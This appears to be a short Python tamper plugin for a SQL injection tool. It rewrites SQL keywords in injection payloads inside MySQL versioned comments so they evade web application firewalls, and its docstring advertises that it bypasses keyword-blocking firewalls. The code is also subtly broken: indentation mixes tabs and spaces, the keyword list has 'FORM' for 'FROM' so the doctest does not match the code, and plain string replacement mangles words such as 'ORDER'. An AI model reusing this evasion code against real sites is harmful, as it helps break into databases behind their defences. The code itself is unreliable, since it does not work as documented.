#!/usr/bin/env python

"""
Tamper script by srakai (swientymateusz at gmail d0t com)
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Encapsulates statements in speciall comment

    Notes:
        * Useful to bypass weak and bespoke web application firewalls
        * Propably works only with MySQL	
        * Baypasses firewalls that forbid certain words
        * Tested against some custom firewalls, did great job

    >>> tamper('SELECT id FROM users')
    '/**//*!50000SELECT*//**/ id /**//*!50000FROM*//**/ users'
    """
  	statements =["SELECT", "UNION", "CONCAT", "FORM", "CAST", "ALL", "OR", "ORDER BY", "WHERE", "HAVING"]	
  	if not payload: return payload
  	for s in statements:
  		payload = payload.replace(s,"/**//*!50000" + s + "*//**/" )
  	
    return payload
